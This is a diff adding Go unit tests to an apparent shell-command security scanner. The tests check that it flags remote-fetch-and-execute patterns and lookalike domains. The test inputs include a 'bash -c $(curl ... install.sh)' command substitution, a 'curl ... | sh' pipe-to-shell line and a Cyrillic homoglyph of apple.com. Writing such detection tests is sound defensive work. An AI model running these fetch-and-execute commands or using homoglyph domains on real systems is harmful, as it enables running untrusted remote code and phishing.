@@ -61,6 +61,26 @@ func TestAnalyzeInputFileLineMapping(t *testing.T) {
 	}
 }
 
+func TestAnalyzeInputFileDetectsMultilineCommandSubstitution(t *testing.T) {
+	input := "bash -c \"$(\ncurl -fsSL https://example.com/install.sh\n)\"\n"
+	findings, lines := analyzeInput(input, nil, "payload.sh")
+	if len(findings) == 0 {
+		t.Fatalf("expected findings for multiline input")
+	}
+	found := false
+	for i, f := range findings {
+		if f.Kind == "fetch-in-command-substitution" {
+			found = true
+			if lines[i] != 1 {
+				t.Fatalf("expected multiline finding to map to start line 1, got %d", lines[i])
+			}
+		}
+	}
+	if !found {
+		t.Fatalf("expected fetch-in-command-substitution finding, got %#v", findings)
+	}
+}
+
 func TestLoadPolicyNotFoundReturnsNil(t *testing.T) {
 	policy, err := loadPolicy("/definitely/missing-policy-file.yaml", false)
 	if err != nil {
@@ -344,5 +364,42 @@ func TestEncodeReportJSONIncludesStats(t *testing.T) {
 	}
 	if decoded.Stats.Total != 2 || decoded.Stats.High != 1 || decoded.Stats.Warn != 1 {
 		t.Fatalf("unexpected stats: %#v", decoded.Stats)
+	}
+}
+
+func TestFindingSignatureStability(t *testing.T) {
+	tests := []struct {
+		name    string
+		finding sentinel.Finding
+		want    string
+	}{
+		{
+			name: "pipe-to-shell",
+			finding: sentinel.Finding{
+				Kind:     "pipe-to-shell",
+				Severity: sentinel.SeverityHigh,
+				Message:  "Remote content piped directly into shell interpreter",
+				Evidence: "curl https://x | sh",
+			},
+			want: "9a74c5d7eaf1187cc37a94ba2191eae3d9d7a94339efc97ff99f8eeb93565bf2",
+		},
+		{
+			name: "non-ascii-domain",
+			finding: sentinel.Finding{
+				Kind:     "non-ascii-domain",
+				Severity: sentinel.SeverityHigh,
+				Message:  "URL host contains non-ASCII characters (punycode: xn--pple-43d.com, confusable-score: 33/100)",
+				Evidence: "аpple.com",
+			},
+			want: "17811129376306fdd461e8535e73dbb1863b257abcf90d087eec8fd1ff774cde",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := findingSignature(tt.finding); got != tt.want {
+				t.Fatalf("findingSignature() = %q, want %q", got, tt.want)
+			}
+		})
 	}
 }
